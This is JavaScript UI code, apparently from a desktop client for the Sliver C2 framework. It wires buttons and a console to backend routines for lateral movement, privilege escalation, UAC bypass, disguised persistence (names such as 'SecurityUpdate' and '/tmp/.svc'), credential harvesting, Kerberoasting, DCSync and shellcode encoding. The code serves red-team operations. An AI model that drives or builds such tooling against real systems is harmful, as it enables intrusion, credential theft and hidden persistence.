    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
    cardDesc.textContent = s.description;

    // Build parameter form fields
    formGrid.innerHTML = '';
    if (s.params && s.params.length > 0) {
      s.params.forEach(p => {
        const field = document.createElement('div');
        let inputHtml = '';
        if (p.type === 'select') {
          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
          inputHtml = `<select id="scr-field-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
        } else {
          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
          const val = p.default || '';
          const ph = p.placeholder || '';
          inputHtml = `<input id="scr-field-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
        }
        field.innerHTML = `<label style="color:var(--muted);font-size:11px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
        formGrid.appendChild(field);
      });
    } else {
      formGrid.innerHTML = '<div style="color:var(--muted);font-size:11.5px;grid-column:1/-1">No extra parameters required. Click Preview or Execute to run on the selected pivot session.</div>';
    }

    paramCard.style.display = 'block';
  }

  function getParamMap() {
    if (!currentScript) return {};
    const map = {};
    if (currentScript.params) {
      currentScript.params.forEach(p => {
        const el = document.getElementById(`scr-field-${p.name}`);
        if (el) map[p.name] = el.value;
      });
    }
    return map;
  }

  // Bind category button clicks
  document.querySelectorAll('.scr-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      selectScript(btn.dataset.method);
    });
  });

  // Select first script by default if available
  if (scripts.length > 0) {
    selectScript(scripts[0].method);
  }

  // Preview button handler
  btnPreview.addEventListener('click', async () => {
    if (!currentScript) return;
    const sid = document.getElementById('scr-session').value;
    if (!sid) { out.textContent = '[!] Select a pivot session first'; return; }

    out.textContent = `[*] Generating dry-run preview for ${currentScript.name}...`;
    btnPreview.disabled = true;
    try {
      const pmap = getParamMap();
      const res = await App().ScriptPreview(sid, currentScript.method, pmap);
      if (res.error) {
        out.textContent = `[ERROR] ${res.error}`;
        out.style.color = 'var(--accent)';
      } else {
        out.textContent = res.output;
        out.style.color = 'var(--cyan)';
      }
    } catch (e) {
      out.textContent = `[ERROR] ${String(e)}`;
      out.style.color = 'var(--accent)';
    }
    btnPreview.disabled = false;
    out.scrollTop = 0;
  });

  // Execute button handler
  btnExec.addEventListener('click', async () => {
    if (!currentScript) return;
    const sid = document.getElementById('scr-session').value;
    if (!sid) { out.textContent = '[!] Select a pivot session first'; return; }

    const method = currentScript.method;
    const pmap = getParamMap();

    out.textContent = `[*] Executing ${currentScript.name}...`;
    btnExec.disabled = true;

    let result;
    try {
      switch (method) {
        case 'ScriptSpawnLocal':
          result = await App().ScriptSpawnLocal(sid, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
          if (!result.error) renderGraph();
          break;
        case 'ScriptSSHDeploy':
          result = await App().ScriptSSHDeploy(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSpawnLinux':
          result = await App().ScriptSpawnLinux(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSSHExecSimple':
          result = await App().ScriptSSHExecSimple(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
          break;
        case 'ScriptSSHCheck':
          result = await App().ScriptSSHCheck(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
          break;
        case 'ScriptSpawnWindows':
          result = await App().ScriptSpawnWindows(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptPsExec':
          result = await App().ScriptPsExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptWMIExec':
          result = await App().ScriptWMIExec(sid, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptWinRMExec':
          result = await App().ScriptWinRMExec(sid, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSCDeploy':
          result = await App().ScriptSCDeploy(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSMBUploadExec':
          result = await App().ScriptSMBUploadExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptPrivescCheck':
          result = await App().ScriptPrivescCheck(sid);
          break;
        case 'ScriptSudoExploit':
          result = await App().ScriptSudoExploit(sid, pmap.method || 'find');
          break;
        case 'ScriptWinPrivescCheck':
          result = await App().ScriptWinPrivescCheck(sid);
          break;
        case 'ScriptTokenImpersonate':
          result = await App().ScriptTokenImpersonate(sid, pmap.targetUser || '');
          break;
        case 'ScriptGetSystem':
          result = await App().ScriptGetSystem(sid, pmap.profile || '');
          break;
        case 'ScriptUACBypass':
          result = await App().ScriptUACBypass(sid, pmap.beaconPath || '');
          break;
        case 'ScriptPersistCron':
          result = await App().ScriptPersistCron(sid, pmap.cronLine || '');
          break;
        case 'ScriptPersistSSHKey':
          result = await App().ScriptPersistSSHKey(sid, pmap.pubKey || '', pmap.targetUser || 'root');
          break;
        case 'ScriptPersistSystemd':
          result = await App().ScriptPersistSystemd(sid, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
          break;
        case 'ScriptPersistRegRun':
          result = await App().ScriptPersistRegRun(sid, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
          break;
        case 'ScriptPersistSchedTask':
          result = await App().ScriptPersistSchedTask(sid, pmap.beaconPath || '', pmap.taskName || '');
          break;
        case 'ScriptPersistService':
          result = await App().ScriptPersistService(sid, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
          break;
        case 'ScriptPersistWMI':
          result = await App().ScriptPersistWMI(sid, pmap.beaconPath || '');
          break;
        case 'ScriptPersistStartup':
          result = await App().ScriptPersistStartup(sid, pmap.beaconPath || '');
          break;
        case 'ScriptHarvestCreds':
          result = await App().ScriptHarvestCreds(sid);
          break;
        case 'ScriptWinHarvestCreds':
          result = await App().ScriptWinHarvestCreds(sid);
          break;
        case 'ScriptKerberoast':
          result = await App().ScriptKerberoast(sid);
          break;
        case 'ScriptDCSync':
          result = await App().ScriptDCSync(sid);
          break;
        case 'ScriptNetworkScan':
          result = await App().ScriptNetworkScan(sid, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
          break;
        case 'ScriptADEnum':
          result = await App().ScriptADEnum(sid);
          break;
        case 'ScriptWinLocalEnum':
          result = await App().ScriptWinLocalEnum(sid);
          break;
        default:
          result = { error: 'Unknown script: ' + method };
      }
    } catch (e) {
      result = { error: String(e) };
    }

    btnExec.disabled = false;
    if (result.error) {
      out.textContent = `[ERROR] ${result.error}\n\n${result.output || ''}`;
      out.style.color = 'var(--accent)';
    } else {
      out.textContent = `[+] ${result.output || 'Done'}`;
      out.style.color = 'var(--ok)';
      // Lineage is recorded per-method above (only for agent-deploying recipes),
      // using the correct {parentID, parentHost} record format. No catch-all here.
    }
    setTimeout(() => { out.style.color = ''; }, 5000);
    out.scrollTop = out.scrollHeight;
  });
}

function pinScripts() {
  hideModal();
  const id = '_scripts_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>Scripts</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1" id="scripts-dock-content">Loading Script Manager...</div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  openScriptsPanel().then(() => {
    const modalBody = document.getElementById('modal-body');
    const dockContent = document.getElementById('scripts-dock-content');
    if (modalBody && dockContent) {
      dockContent.innerHTML = modalBody.innerHTML;
      hideModal();
    }
  });
}
document.getElementById('modal-overlay').addEventListener('click', e => { if (e.target.id === 'modal-overlay') hideModal(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') hideModal(); });

// ── Operator notes (per agent, in-memory) ───────────────────────────────────
document.getElementById('notes-btn').addEventListener('click', openNotes);
function openNotes() {
  if (!activeInteractId) return toast('info', 'Open an agent first (double-click a session/beacon)');
  const t = openTabs[activeInteractId], o = t && t.obj;
  const title = `Notes - ${o ? (o.hostname || o.id.slice(0,8)) : activeInteractId}`;
  openViewPanel('_notes', title,
    `<p style="color:var(--muted);font-size:12px;margin-bottom:8px">Notes are per-agent, saved locally per teamserver, and restored on reconnect. Auto-saved as you type.</p>
     <textarea id="notes-area" class="notes-area" placeholder="Credentials found, next steps, IOCs, todo...">${esc(notesMap[activeInteractId] || '')}</textarea>`);
  const ta = document.getElementById('notes-area');
  ta.addEventListener('input', () => { notesMap[activeInteractId] = ta.value; markNoted(activeInteractId); saveState(); });
  setTimeout(() => ta.focus(), 30);
}
// markNoted adds a small dot to a tab that has notes.
function markNoted(id) {
  const tab = document.querySelector(`.interact-tab[data-tid="${id}"] span`);
  if (tab && notesMap[id] && notesMap[id].trim() && !tab.textContent.startsWith('•')) tab.textContent = '• ' + tab.textContent;
}

// ── Server console (teamserver commands, pinned like the event log) ──────────
const SERVER_HELP = `Server console - runs teamserver commands (NOT on a target).
  help                     this help
  version                  teamserver version
  sessions                 list sessions
  beacons                  list beacons
  jobs | listeners         list active listeners
  jobs kill <id>           kill a listener/job
  operators | players      list operators
  loot [rm <id> | rename <id> <name>]   list / remove / rename loot
  hosts [rm <id> | ioc-rm <ioc-id>]     list / remove hosts / remove host IOC
  creds [add <u> <p> | rm <id>]   list / add / remove credentials
  builds                   list implant builds
  regenerate <name>        re-download a previous build
  profiles                 list implant profiles
  websites [rm <name>]     list / remove hosted websites
  canaries                 list DNS canaries (tripwires)
  stager <host> <port> <profile>   start a TCP stager listener
  use <id-prefix>          interact with a session/beacon
  c2profiles               list HTTP C2 profiles
  c2profile <name>         view a full HTTP C2 profile (JSON)
  c2profile edit <name>    open the HTTP C2 profile editor
  c2profile new            create a new HTTP C2 profile
  certificates | ca        list issued / CA certificates
  compiler                 teamserver build capabilities
  builders                 external build servers
  traffic-encoders         list WASM traffic encoders
  shellcode-encoders       list shellcode encoders
  armory                   list available armory packages
  armory install <name>    install an armory package
  armory remove <name>     remove an armory package
  shellcode-rdi <dll> <func> [args]   convert a DLL to shellcode (sRDI)
  shellcode-encode <bin> [arch] [iter]   encode shellcode (shikata-ga-nai)
  monitor [start|stop|list|add <type> <key>|del <id>]  threat-monitoring
  website add|update <site> <web-path> <local-file> | rm <site> <web-path>
  pivots | pivot-graph     show the pivot (peer) topology
  wg-client-config         generate a WireGuard client config
  wg-unique-ip             allocate a unique WireGuard peer IP
  creds [add|rm|update <id> <plain>|sniff <hash>|get <id>]   credential store
  restart-jobs <id...>     restart listener jobs
  rename <id> <name>       rename a session
  kill-session <id>        kill a session
  kill-beacon <id>         remove a beacon
  mtls [port]              start an mTLS listener (default 8443)
  http [port]              start an HTTP listener (default 80)
  https [port]             start an HTTPS listener (default 443)
  dns <domain...>          start a DNS listener
  wg [port] [nport] [key]  start a WireGuard listener
  clear                    clear this console`;

function pinServerConsole() {
  const id = '_server_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>Server</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div class="console-out" id="sc-out"><span class="info">Sliver server console - type 'help'. These commands run on the teamserver.\n</span></div>
    <div class="console-in"><span class="console-prompt">sliver &gt; </span><input class="console-input" id="sc-inp" placeholder="server command..." autocomplete="off"/></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  const inp = document.getElementById('sc-inp');
  const hist = []; let hi = -1;
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
      let v = inp.value.trim(); inp.value = ''; hi = -1;
      // Apply features-bundle alias expander if installed.
      if (typeof window.expandAlias === 'function') v = window.expandAlias(v);
      if (v) { hist.unshift(v); runServerCmd(v); }
    }
    if (e.key === 'ArrowUp') { if (hi < hist.length-1) { hi++; inp.value = hist[hi]; } e.preventDefault(); }
    if (e.key === 'ArrowDown') { if (hi > 0) { hi--; inp.value = hist[hi]; } else { hi = -1; inp.value = ''; } e.preventDefault(); }
  });
  activateTab(id);
}
function appendServer(text, cls) {
  const o = document.getElementById('sc-out'); if (!o) return;
  const s = document.createElement('span'); s.className = cls || 'out'; s.textContent = text + '\n';
  o.appendChild(s); o.scrollTop = o.scrollHeight;
}
async function runServerCmd(raw) {
  const parts = tok(raw), cmd = (parts[0]||'').toLowerCase(), args = parts.slice(1);
  appendServer(raw, 'cmd');
  try {
    switch (cmd) {
      case 'help': return appendServer(SERVER_HELP, 'info');
      case 'clear': { const o = document.getElementById('sc-out'); if (o) o.innerHTML = ''; return; }
      case 'version': { const v = await App().GetVersion(); return appendServer(`Sliver v${v.major}.${v.minor}.${v.patch}  ${v.os}/${v.arch}  (${v.compiled||''})`, 'out'); }
      case 'sessions': {
        const s = await App().ListSessions(); if (!s.length) return appendServer('no sessions', 'info');
        let o = 'ID           HOST                 USER                 OS/ARCH\n';
        s.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${x.os}/${x.arch}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'beacons': {
        const b = await App().ListBeacons(); if (!b.length) return appendServer('no beacons', 'info');
        let o = 'ID           HOST                 USER                 INTERVAL\n';
        b.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${fmtDur(x.interval)}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'jobs': case 'listeners': {
        if (args[0] === 'kill') { await App().KillJob(parseInt(args[1])); return appendServer(`[+] job ${args[1]} killed`, 'out'); }
        const j = await App().ListJobs(); if (!j.length) return appendServer('no active jobs', 'info');
        let o = 'ID    NAME       PROTO   PORT\n';
        j.forEach(x => o += `${String(x.id).padEnd(6)}${(x.name||'').padEnd(11)}${(x.protocol||'').padEnd(8)}${x.port||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'operators': case 'players': {
        const ops = await App().ListOperators(); if (!ops.length) return appendServer('no operators', 'info');
        return appendServer(ops.map(o => `${o.online?'[online] ':'[offline]'} ${o.name}`).join('\n'), 'out');
      }
      case 'loot': {
        if (args[0] === 'rm') { await App().DeleteLoot(args[1]); return appendServer(`[+] loot ${args[1]} removed`, 'out'); }
        if (args[0] === 'rename') { if (args.length < 3) return appendServer('usage: loot rename <id> <new-name>', 'err'); await App().RenameLoot(args[1], args.slice(2).join(' ')); return appendServer('[+] loot renamed', 'out'); }
        const l = await App().GetLoot(); if (!l.length) return appendServer('loot store empty', 'info');
        return appendServer(l.map(x => `${x.id.slice(0,12)}  ${(x.type||'').padEnd(10)} ${x.name}`).join('\n'), 'out');
      }
      case 'builds': { const b = await App().GetBuildHistory(); if (!b.length) return appendServer('no builds', 'info'); return appendServer(b.map(x => `${(x.name||'').padEnd(24)} ${x.goos}/${x.goarch} ${x.format}`).join('\n'), 'out'); }
      case 'profiles': { const p = await App().ListImplantProfiles(); if (!p.length) return appendServer('no profiles', 'info'); return appendServer(p.map(x => `${(x.name||'').padEnd(20)} ${x.goos}/${x.goarch} ${x.c2Url||''}`).join('\n'), 'out'); }
      case 'use': {
        if (!args[0]) return appendServer('usage: use <id-prefix>', 'err');
        const all = [...allSessions.map(s => ({kind:'session',obj:s})), ...allBeacons.map(b => ({kind:'beacon',obj:b}))];
        const m = all.find(a => a.obj.id.startsWith(args[0]));
        if (!m) return appendServer(`no session/beacon matching ${args[0]}`, 'err');
        openInteract(m.kind, m.obj); return appendServer(`[+] interacting with ${m.obj.hostname}`, 'out');
      }
      case 'mtls': { await App().StartMTLSListener({host:'0.0.0.0',port:parseInt(args[0])||8443}); return appendServer(`[+] mTLS listener started on :${parseInt(args[0])||8443}`, 'out'); }
      case 'http': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||80,secure:false}); return appendServer(`[+] HTTP listener started on :${parseInt(args[0])||80}`, 'out'); }
      case 'https': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||443,secure:true}); return appendServer(`[+] HTTPS listener started on :${parseInt(args[0])||443}`, 'out'); }
      case 'dns': { if (!args.length) return appendServer('usage: dns <domain...>', 'err'); await App().StartDNSListener({domains:args}); return appendServer(`[+] DNS listener for ${args.join(', ')}`, 'out'); }
      case 'wg': case 'wireguard': { await App().StartWGListener({port:parseInt(args[0])||53,nPort:parseInt(args[1])||8888,keyPort:parseInt(args[2])||1337}); return appendServer(`[+] WireGuard listener started`, 'out'); }
      case 'kill-session': case 'rm-session': { if (!args[0]) return appendServer('usage: kill-session <id-prefix>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().KillSession(s.id); return appendServer(`[+] killed session ${s.hostname}`, 'out'); }
      case 'kill-beacon': case 'rm-beacon': { if (!args[0]) return appendServer('usage: kill-beacon <id-prefix>', 'err'); const b = allBeacons.find(x => x.id.startsWith(args[0])); if (!b) return appendServer('no matching beacon', 'err'); await App().KillBeacon(b.id); return appendServer(`[+] removed beacon ${b.hostname}`, 'out'); }
      case 'rename': { if (args.length < 2) return appendServer('usage: rename <session-id-prefix> <new-name>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().RenameSession(s.id, args.slice(1).join(' ')); refreshAgents(); return appendServer('[+] renamed', 'out'); }
      case 'c2profiles': { const p = await App().ListC2Profiles(); if (!p.length) return appendServer('no HTTP C2 profiles', 'info'); return appendServer(p.map(x => x.name).join('\n'), 'out'); }
      case 'certificates': case 'certs': {
        const c = await App().ListCertificates(); if (!c.length) return appendServer('no certificates', 'info');
        let o = 'CN                             TYPE            KEYALG     EXPIRES\n';
        c.forEach(x => o += `${(x.cn||'').slice(0,30).padEnd(31)}${(x.type||'').padEnd(16)}${(x.keyAlgorithm||'').padEnd(11)}${x.validExpiry||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'compiler': case 'compiler-info': {
        const c = await App().GetCompilerInfo();
        let o = `server: ${c.goos}/${c.goarch}\ncross-compilers: ${(c.crossCompilers||[]).join(', ')||'none'}\ntargets:\n`;
        (c.targets||[]).forEach(t => o += `  ${t.goos}/${t.goarch} (${t.format})\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'builders': {
        const b = await App().ListBuilders(); if (!b.length) return appendServer('no external builders registered', 'info');
        return appendServer(b.map(x => `${(x.name||'').padEnd(20)} ${x.goos}/${x.goarch}  op=${x.operatorName}  [${x.templates}]`).join('\n'), 'out');
      }
      case 'traffic-encoders': { const t = await App().ListTrafficEncoders(); return appendServer(t.length ? t.join('\n') : 'no traffic encoders', t.length?'out':'info'); }
      case 'shellcode-encoders': { const s = await App().ListShellcodeEncoders(); return appendServer(s.length ? s.join('\n') : 'no shellcode encoders', s.length?'out':'info'); }
      case 'armory': {
        const sub = (args[0]||'').toLowerCase();
        if (sub === 'install') {
          if (!args[1]) return appendServer('usage: armory install <name>', 'err');
          appendServer(`[*] installing ${args[1]}...`, 'info');
          const err = await App().ArmoryInstall(args[1]).then(() => null).catch(e => String(e));
          return appendServer(err ? `[!] ${err}` : `[+] ${args[1]} installed`, err ? 'err' : 'out');
        }
        if (sub === 'remove' || sub === 'rm') {
          if (!args[1]) return appendServer('usage: armory remove <name>', 'err');
          const err = await App().ArmoryRemove(args[1]).then(() => null).catch(e => String(e));
          return appendServer(err ? `[!] ${err}` : `[+] ${args[1]} removed`, err ? 'err' : 'out');
        }
        const pkgs = await App().ArmoryList().catch(e => { appendServer(`[!] ${e}`, 'err'); return null; });
        if (!pkgs) return;
        if (!pkgs.length) return appendServer('no armory packages available', 'info');
        let out = `${'NAME'.padEnd(28)}${'TYPE'.padEnd(11)}${'INSTALLED'.padEnd(11)}DESCRIPTION
`;
        pkgs.forEach(p => { out += `${(p.name||'').slice(0,27).padEnd(28)}${(p.type||'').padEnd(11)}${(p.installed?'yes':'no').padEnd(11)}${(p.description||'').slice(0,50)}
`; });
        return appendServer(out.trimEnd(), 'out');
      }
      case 'restart-jobs': { if (!args.length) return appendServer('usage: restart-jobs <id> [id...]', 'err'); await App().RestartJobs(args.map(a => parseInt(a))); return appendServer(`[+] restarted jobs ${args.join(', ')}`, 'out'); }
      case 'ca': case 'certificate-authority': {
        const c = await App().ListCAInfo(); if (!c.length) return appendServer('no CA certificates', 'info');
        let o = 'CN                             TYPE            KEYALG     EXPIRES\n';
        c.forEach(x => o += `${(x.cn||'').slice(0,30).padEnd(31)}${(x.type||'').padEnd(16)}${(x.keyAlgorithm||'').padEnd(11)}${x.validExpiry||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'monitor': {
        const sub = (args[0]||'list').toLowerCase();
        if (sub === 'start') { await App().StartMonitor(); return appendServer('[+] monitor started', 'out'); }
        if (sub === 'stop')  { await App().StopMonitor();  return appendServer('[+] monitor stopped', 'out'); }
        if (sub === 'add')   { if (args.length < 3) return appendServer('usage: monitor add <type> <apikey> [apipassword]', 'err'); await App().AddMonitorConfig(args[1], args[2], args[3]||''); return appendServer('[+] monitoring provider added', 'out'); }
        if (sub === 'del' || sub === 'rm') { if (!args[1]) return appendServer('usage: monitor del <id>', 'err'); await App().DelMonitorConfig(args[1]); return appendServer('[+] provider removed', 'out'); }
        const p = await App().ListMonitorConfig(); if (!p.length) return appendServer('no monitoring providers configured', 'info');
        return appendServer(p.map(x => `${(x.id||'').padEnd(16)} ${x.type}`).join('\n'), 'out');
      }
      case 'pivot-graph': case 'pivots': {
        const g = await App().GetPivotGraph(); if (!g.length) return appendServer('no pivots', 'info');
        const lines = []; const walk = (n, d) => { lines.push(`${'  '.repeat(d)}${n.hostname||n.name||('peer '+n.peerId)}`); (n.children||[]).forEach(c => walk(c, d+1)); };
        g.forEach(n => walk(n, 0)); return appendServer(lines.join('\n'), 'out');
      }
      case 'wg-client-config': {
        const c = await App().GenerateWGClientConfig();
        return appendServer(`ClientIP:         ${c.clientIP}\nClientPrivateKey: ${c.clientPrivateKey}\nClientPubKey:     ${c.clientPubKey}\nServerPubKey:     ${c.serverPubKey}`, 'out');
      }
      case 'wg-unique-ip': { const ip = await App().GenerateUniqueWGIP(); return appendServer(`[+] unique WG IP: ${ip}`, 'out'); }
      case 'dll2shellcode': case 'srdi': {
        if (args.length < 2) return appendServer('usage: dll2shellcode <local.dll> <function> [args]', 'err');
        const p = await App().ConvertDLLToShellcode(args[0], args[1], args.slice(2).join(' '));
        return appendServer(`[+] shellcode saved to ${p}`, 'out');
      }
      case 'shellcode-encode': {
        if (!args[0]) return appendServer('usage: shellcode-encode <local.bin> [arch=amd64] [iterations=1]', 'err');
        const p = await App().EncodeShellcode(args[0], args[1]||'amd64', parseInt(args[2])||1);
        return appendServer(`[+] encoded shellcode saved to ${p}`, 'out');
      }
      case 'c2profile': {
        if (args[0] === 'edit') { if (!args[1]) return appendServer('usage: c2profile edit <name>', 'err'); openC2Editor(args[1]); return appendServer(`[*] editing HTTP C2 profile ${args[1]}`, 'info'); }
        if (args[0] === 'new')  { openC2Editor(''); return appendServer('[*] new HTTP C2 profile editor opened', 'info'); }
        if (!args[0]) return appendServer('usage: c2profile <name> | edit <name> | new   (view/edit HTTP C2 profiles)', 'err');
        const j = await App().GetHTTPC2Profile(args[0]); return appendServer(j, 'out');
      }
      case 'website': {
        const sub = (args[0]||'').toLowerCase();
        if (sub === 'add') { if (args.length < 4) return appendServer('usage: website add <site> <web-path> <local-file>', 'err'); await App().AddWebsiteContent(args[1], args[2], args[3]); return appendServer('[+] content added', 'out'); }
        if (sub === 'update') { if (args.length < 4) return appendServer('usage: website update <site> <web-path> <local-file>', 'err'); await App().UpdateWebsiteContent(args[1], args[2], args[3]); return appendServer('[+] content updated', 'out'); }
        if (sub === 'rm')  { if (args.length < 3) return appendServer('usage: website rm <site> <web-path>', 'err'); await App().RemoveWebsiteContent(args[1], args[2]); return appendServer('[+] content removed', 'out'); }
        const w = await App().ListWebsites(); if (!w || !w.length) return appendServer('no websites', 'info');
        return appendServer(w.map(x => x.name).join('\n'), 'out');
      }
      case 'hosts': {
        if (args[0] === 'rm') { await App().DeleteHost(args[1]); return appendServer(`[+] host ${args[1]} removed`, 'out'); }
        if (args[0] === 'ioc-rm') { if (!args[1]) return appendServer('usage: hosts ioc-rm <ioc-id> [path] [filehash]', 'err'); await App().RemoveHostIOC(args[1], args[2]||'', args[3]||''); return appendServer('[+] host IOC removed', 'out'); }
        const h = await App().ListHosts(); if (!h.length) return appendServer('no hosts in the database', 'info');
        let o = 'HOSTNAME             OS                             UUID\n';
        h.forEach(x => o += `${(x.hostname||'').slice(0,20).padEnd(21)}${(x.os||'').slice(0,30).padEnd(31)}${(x.uuid||'').slice(0,12)}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'creds': {
        if (args[0] === 'add') { if (args.length < 3) return appendServer('usage: creds add <username> <password>', 'err'); await App().AddCred(args[1], args[2], ''); return appendServer('[+] credential added', 'out'); }
        if (args[0] === 'rm') { await App().DeleteCred(args[1]); return appendServer(`[+] credential ${args[1]} removed`, 'out'); }
        if (args[0] === 'update') { if (args.length < 3) return appendServer('usage: creds update <id> <plaintext>', 'err'); await App().UpdateCredential(args[1], '', args[2], '', true); return appendServer('[+] credential updated', 'out'); }
        if (args[0] === 'sniff') { if (!args[1]) return appendServer('usage: creds sniff <hash>', 'err'); const ht = await App().SniffCredHashType(args[1]); return appendServer(`hash type: ${ht}`, 'out'); }
        if (args[0] === 'get') { if (!args[1]) return appendServer('usage: creds get <id>', 'err'); const c = await App().GetCredential(args[1]); return appendServer(`ID:        ${c.id}\nUsername:  ${c.username}\nPlaintext: ${c.plaintext}\nHash:      ${c.hash}\nCracked:   ${c.cracked}`, 'out'); }
        const c = await App().ListCreds(); if (!c.length) return appendServer('no credentials stored', 'info');
        let o = 'USERNAME             PLAINTEXT / HASH\n';
        c.forEach(x => o += `${(x.username||'').slice(0,20).padEnd(21)}${x.plaintext || x.hash || ''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'regenerate': { if (!args[0]) return appendServer('usage: regenerate <build-name>', 'err'); const r = await App().RegenerateBuild(args[0]); return appendServer(r.error ? `[error] ${r.error}` : `[+] saved ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out'); }
      case 'websites': {
        if (args[0] === 'rm') { await App().RemoveWebsite(args[1]); return appendServer(`[+] website ${args[1]} removed`, 'out'); }
        const w = await App().ListWebsites(); if (!w.length) return appendServer('no websites', 'info');
        return appendServer(w.map(x => `${(x.name||'').padEnd(20)} ${x.paths} path(s)`).join('\n'), 'out');
      }
      case 'canaries': {
        const c = await App().ListCanaries(); if (!c.length) return appendServer('no canaries', 'info');
        let o = 'DOMAIN                         IMPLANT              TRIGGERED  COUNT\n';
        c.forEach(x => o += `${(x.domain||'').slice(0,30).padEnd(31)}${(x.implantName||'').slice(0,20).padEnd(21)}${(x.triggered?'YES':'no').padEnd(11)}${x.count}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'stager': {
        if (args.length < 3) return appendServer('usage: stager <host> <port> <profile>', 'err');
        const jid = await App().StartStagerListener(args[0], parseInt(args[1]), args[2]).catch(e => { appendServer(`[error] ${e}`, 'err'); return null; });
        if (jid !== null) return appendServer(`[+] TCP stager listener started on ${args[0]}:${args[1]} (job ${jid})`, 'out');
        return;
      }
      default: appendServer(`unknown server command: ${cmd}  (type 'help')`, 'err');
    }
  } catch (e) { appendServer('[error] ' + e, 'err'); }
}

function openEventsPanel() {
  const content = `<div style="display:flex;justify-content:flex-end;margin-bottom:8px"><button class="btn small" onclick="pinEvents()">Pin to console</button></div><div class="event-log" data-events-list style="max-height:64vh"></div>`;
  openViewPanel('_events', 'Event Log', content);
  renderEventsList();
}
